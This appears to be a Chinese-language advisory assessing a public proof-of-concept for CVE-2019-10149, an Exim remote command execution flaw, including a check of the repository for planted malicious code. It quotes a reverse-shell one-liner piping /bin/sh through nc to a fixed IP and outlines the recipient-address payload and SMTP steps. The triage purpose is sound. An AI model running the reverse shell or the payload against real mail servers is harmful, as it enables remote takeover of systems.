## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)